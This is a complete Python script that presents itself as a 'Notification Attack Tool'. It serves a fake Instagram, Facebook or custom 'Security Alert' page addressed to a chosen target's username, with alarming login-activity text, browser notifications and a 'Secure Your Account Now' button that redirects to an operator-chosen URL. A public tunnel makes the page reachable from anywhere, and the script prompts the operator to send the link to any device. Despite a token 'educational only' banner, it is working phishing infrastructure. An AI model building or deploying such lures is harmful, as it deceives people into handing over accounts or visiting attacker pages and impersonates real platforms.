#!/usr/bin/env python3
"""
LOVE ❤ HACKER - Notification Tool
Choose Host Platform First
"""

import os
import sys
import time
import requests
import threading
import subprocess
import socket
from flask import Flask, request, redirect, send_from_directory

# Colors for terminal
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

app = Flask(__name__)

# Global variables
notification_data = {
    'title': '',
    'message': '',
    'type': '',
    'redirect_url': '',
    'icon_url': ''
}

# Icons folder path
ICONS_FOLDER = 'icons'

def clear_screen():
    os.system('clear')

def show_banner():
    banner = f"""
{colors.RED}
╔═══════════════════════════════════════════╗
║           LOVE ❤ HACKER PRESENTS         ║
║         NOTIFICATION ATTACK TOOL          ║
║         CHOOSE HOST PLATFORM FIRST        ║
║              EDUCATIONAL ONLY             ║
╚═══════════════════════════════════════════╝
{colors.RESET}
"""
    print(banner)

def create_icons_folder():
    """Create icons folder if not exists"""
    if not os.path.exists(ICONS_FOLDER):
        os.makedirs(ICONS_FOLDER)
        print(f"{colors.GREEN}[+] Created icons folder{colors.RESET}")
    
    print(f"{colors.CYAN}[*] Available icons in folder:{colors.RESET}")
    icon_files = [f for f in os.listdir(ICONS_FOLDER) if f.endswith(('.png', '.jpg', '.jpeg'))]
    if icon_files:
        for icon_file in icon_files:
            print(f"    📁 {icon_file}")
    else:
        print(f"    {colors.YELLOW}No icons found. Add icons to {ICONS_FOLDER}/ folder{colors.RESET}")

def get_available_icons():
    """Get list of available icons in icons folder"""
    icons = {}
    if os.path.exists(ICONS_FOLDER):
        for file in os.listdir(ICONS_FOLDER):
            if file.endswith(('.png', '.jpg', '.jpeg')):
                icon_name = os.path.splitext(file)[0]
                icons[icon_name] = f"/icons/{file}"
    return icons

def get_local_ip():
    """Get local IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

def start_localxpose_tunnel(port=8080, token=None):
    """Start LocalXpose Tunnel"""
    try:
        print(f"{colors.GREEN}[+] Starting LocalXpose Tunnel...{colors.RESET}")
        
        # LocalXpose command
        cmd = ['localxpose', 'tunnel', 'http', '--to', f'localhost:{port}']
        
        # Add token if provided
        if token:
            cmd.extend(['--auth', token])
            print(f"{colors.GREEN}[+] Using LocalXpose token{colors.RESET}")
        
        # Start LocalXpose
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Wait for tunnel URL
        time.sleep(5)
        
        # Try to get URL from output
        url_printed = False
        for _ in range(15):
            line = process.stdout.readline()
            if line:
                line = line.strip()
                print(f"{colors.CYAN}[LocalXpose] {line}{colors.RESET}")
                if 'lxp.io' in line or 'localxpose.io' in line or 'http' in line:
                    # Extract URL from line
                    words = line.split()
                    for word in words:
                        if word.startswith('http'):
                            if not url_printed:
                                print(f"{colors.GREEN}[+] LocalXpose URL: {word}{colors.RESET}")
                                url_printed = True
                            return word, process
            time.sleep(1)
        
        return "https://your-tunnel.lxp.io", process
        
    except Exception as e:
        print(f"{colors.RED}[-] LocalXpose Error: {e}{colors.RESET}")
        return None, None

def start_web_server(port=8080):
    # Serve icons from local folder
    @app.route('/icons/<filename>')
    def serve_icon(filename):
        return send_from_directory(ICONS_FOLDER, filename)

    @app.route('/')
    def home():
        return f"""
        <html>
        <head>
            <title>Security Alert</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body {{ 
                    font-family: Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: #fff; 
                    text-align: center; 
                    padding: 20px;
                    margin: 0;
                    min-height: 100vh;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                }}
                .notification {{
                    background: rgba(255, 255, 255, 0.1);
                    backdrop-filter: blur(10px);
                    padding: 30px;
                    border-radius: 20px;
                    margin: 20px auto;
                    max-width: 400px;
                    border: 1px solid rgba(255, 255, 255, 0.2);
                    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
                }}
                .icon {{
                    width: 80px;
                    height: 80px;
                    border-radius: 20px;
                    margin-bottom: 20px;
                    border: 3px solid #fff;
                }}
                .btn {{
                    background: linear-gradient(45deg, #FF416C, #FF4B2B);
                    color: white;
                    padding: 15px 30px;
                    border: none;
                    border-radius: 25px;
                    cursor: pointer;
                    margin: 15px 0;
                    font-size: 16px;
                    font-weight: bold;
                    width: 100%;
                    transition: all 0.3s ease;
                }}
                .btn:hover {{
                    transform: translateY(-2px);
                    box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
                }}
                .alert-badge {{
                    background: #ff4757;
                    color: white;
                    padding: 5px 15px;
                    border-radius: 15px;
                    font-size: 14px;
                    margin-bottom: 15px;
                    display: inline-block;
                }}
            </style>
            <script>
                function showNotification() {{
                    if('Notification' in window) {{
                        Notification.requestPermission().then(permission => {{
                            if(permission === 'granted') {{
                                new Notification('{notification_data['title']}', {{
                                    body: '{notification_data['message']}',
                                    icon: '{notification_data['icon_url']}',
                                    requireInteraction: true
                                }});
                            }}
                        }});
                    }}
                }}
                window.onload = showNotification;
            </script>
        </head>
        <body>
            <div class="notification">
                <img src="{notification_data['icon_url']}" class="icon" alt="App Icon">
                <div class="alert-badge">⚠️ SECURITY ALERT</div>
                <h2>{notification_data['title']}</h2>
                <p style="font-size: 16px; line-height: 1.5; margin: 20px 0;">{notification_data['message']}</p>
                <button class="btn" onclick="window.location.href='{notification_data['redirect_url']}'">
                    🔐 Secure Your Account Now
                </button>
                <p style="font-size: 12px; opacity: 0.8; margin-top: 15px;">
                    Click to protect your account
                </p>
            </div>
        </body>
        </html>
        """

    print(f"{colors.GREEN}[+] Starting web server on port {port}...{colors.RESET}")
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=port, debug=False)).start()
    time.sleep(2)

def main():
    clear_screen()
    show_banner()
    
    print(f"{colors.YELLOW}[!] Educational Purpose Only!{colors.RESET}")
    print(f"{colors.YELLOW}[!] Use only on devices you own.{colors.RESET}\n")
    
    # Create icons folder
    create_icons_folder()
    
    # Host Platform Selection FIRST
    print(f"{colors.WHITE}Choose Host Platform:{colors.RESET}")
    print(f"{colors.GREEN}1. LocalXpose (Global Access){colors.RESET}")
    print(f"{colors.BLUE}2. LocalHost (Same Network){colors.RESET}")
    
    host_choice = input(f"\n{colors.CYAN}Enter your choice (1/2): {colors.RESET}").strip()
    
    lxp_token = None
    if host_choice == '1':
        print(f"\n{colors.CYAN}[?] LocalXpose Token:{colors.RESET}")
        print(f"{colors.YELLOW}Get free token from: https://localxpose.io{colors.RESET}")
        lxp_token = input(f"{colors.CYAN}Enter your LocalXpose token: {colors.RESET}").strip()
        if not lxp_token:
            print(f"{colors.YELLOW}[!] Continuing without token...{colors.RESET}")
    
    # App Platform Selection
    print(f"\n{colors.WHITE}Select App Platform:{colors.RESET}")
    print(f"{colors.GREEN}1. Instagram{colors.RESET}")
    print(f"{colors.BLUE}2. Facebook{colors.RESET}")
    print(f"{colors.PURPLE}3. Custom{colors.RESET}")
    
    try:
        choice = input(f"\n{colors.CYAN}Enter choice (1/2/3): {colors.RESET}").strip()
        
        # Get available icons
        available_icons = get_available_icons()
        
        if choice == '1':
            platform = "Instagram"
            username = input(f"{colors.CYAN}Enter Instagram username: {colors.RESET}").strip()
            message = f"@{username}, we detected unusual login activity from a new device. Your account may be at risk. Secure it now to prevent unauthorized access."
            title = "Instagram Security Alert ⚠️"
            
            # Select icon
            if 'instagram' in available_icons:
                icon_url = available_icons['instagram']
                print(f"{colors.GREEN}[+] Using local Instagram icon{colors.RESET}")
            else:
                icon_url = 'https://cdn-icons-png.flaticon.com/512/174/174855.png'
                print(f"{colors.YELLOW}[!] Using default online icon{colors.RESET}")
            
        elif choice == '2':
            platform = "Facebook"
            username = input(f"{colors.CYAN}Enter Facebook username: {colors.RESET}").strip()
            message = f"{username}, suspicious activity detected on your account. Someone tried to login from an unrecognized device. Secure your account immediately."
            title = "Facebook Security Alert ⚠️"
            
            # Select icon
            if 'facebook' in available_icons:
                icon_url = available_icons['facebook']
                print(f"{colors.GREEN}[+] Using local Facebook icon{colors.RESET}")
            else:
                icon_url = 'https://cdn-icons-png.flaticon.com/512/124/124010.png'
                print(f"{colors.YELLOW}[!] Using default online icon{colors.RESET}")
            
        elif choice == '3':
            platform = input(f"{colors.CYAN}Enter platform name: {colors.RESET}").strip()
            username = input(f"{colors.CYAN}Enter username: {colors.RESET}").strip()
            message = input(f"{colors.CYAN}Enter custom message: {colors.RESET}").strip()
            title = f"{platform} Security Alert ⚠️"
            
            # Custom icon selection
            if available_icons:
                print(f"\n{colors.WHITE}Available Icons:{colors.RESET}")
                icons_list = list(available_icons.keys())
                for i, icon_name in enumerate(icons_list, 1):
                    print(f"{colors.CYAN}{i}. {icon_name}{colors.RESET}")
                
                icon_choice = input(f"{colors.CYAN}Select icon (number) or press enter for default: {colors.RESET}").strip()
                if icon_choice.isdigit() and 1 <= int(icon_choice) <= len(icons_list):
                    icon_url = available_icons[icons_list[int(icon_choice)-1]]
                    print(f"{colors.GREEN}[+] Using local icon: {icons_list[int(icon_choice)-1]}{colors.RESET}")
                else:
                    icon_url = 'https://cdn-icons-png.flaticon.com/512/1827/1827370.png'
            else:
                icon_url = 'https://cdn-icons-png.flaticon.com/512/1827/1827370.png'
        
        else:
            print(f"{colors.RED}[-] Invalid choice!{colors.RESET}")
            return
        
        # Redirect URL
        print(f"\n{colors.WHITE}Enter redirect URL:{colors.RESET}")
        print(f"{colors.YELLOW}Example: https://example.com{colors.RESET}")
        redirect_url = input(f"{colors.CYAN}URL: {colors.RESET}").strip()
        
        if not redirect_url.startswith('http'):
            redirect_url = 'https://' + redirect_url
        
        # Update global data
        notification_data.update({
            'title': title,
            'message': message,
            'type': platform,
            'redirect_url': redirect_url,
            'icon_url': icon_url
        })
        
        # Show preview
        print(f"\n{colors.GREEN}[+] Notification Ready:{colors.RESET}")
        print(f"{colors.CYAN}Platform: {colors.WHITE}{platform}{colors.RESET}")
        print(f"{colors.CYAN}Username: {colors.WHITE}{username}{colors.RESET}")
        print(f"{colors.CYAN}Message: {colors.WHITE}{message}{colors.RESET}")
        print(f"{colors.CYAN}Redirect: {colors.WHITE}{redirect_url}{colors.RESET}")
        
        # Start web server
        port = 8080
        start_web_server(port)
        
        local_ip = get_local_ip()
        local_url = f"http://{local_ip}:{port}"
        
        # Start selected host platform
        tunnel_process = None
        public_url = None
        
        if host_choice == '1':  # LocalXpose
            public_url, tunnel_process = start_localxpose_tunnel(port, lxp_token)
        elif host_choice == '2':  # LocalHost
            print(f"{colors.GREEN}[+] Local Host Mode Selected{colors.RESET}")
            public_url = None
        else:
            print(f"{colors.RED}[-] Invalid host choice!{colors.RESET}")
            return
        
        # Show final links
        print(f"\n{colors.GREEN}[✅] SERVER STARTED SUCCESSFULLY!{colors.RESET}")
        
        if host_choice == '1' and public_url:
            print(f"{colors.CYAN}[🌐] LocalXpose Global Link:{colors.RESET}")
            print(f"{colors.WHITE}{public_url}{colors.RESET}")
            print(f"{colors.YELLOW}[📱] Send to ANY device worldwide{colors.RESET}")
            print()
        
        if host_choice == '2' or host_choice == '1':
            print(f"{colors.CYAN}[🏠] Local Network Links:{colors.RESET}")
            print(f"{colors.WHITE}{local_url}{colors.RESET}")
            print(f"{colors.WHITE}http://localhost:{port}{colors.RESET}")
            if host_choice == '2':
                print(f"{colors.YELLOW}[⚠️] Both devices must be on same WiFi{colors.RESET}")
        
        print(f"\n{colors.RED}[❤] Tool by LOVE HACKER{colors.RESET}")
        print(f"{colors.RED}[⏹️] Press Ctrl+C to stop server{colors.RESET}")
        
        # Keep running
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print(f"\n{colors.RED}[!] Stopping server...{colors.RESET}")
            if tunnel_process:
                tunnel_process.terminate()
            
    except KeyboardInterrupt:
        print(f"\n{colors.RED}[!] Server stopped{colors.RESET}")
    except Exception as e:
        print(f"{colors.RED}[-] Error: {e}{colors.RESET}")

if __name__ == "__main__":
    main()
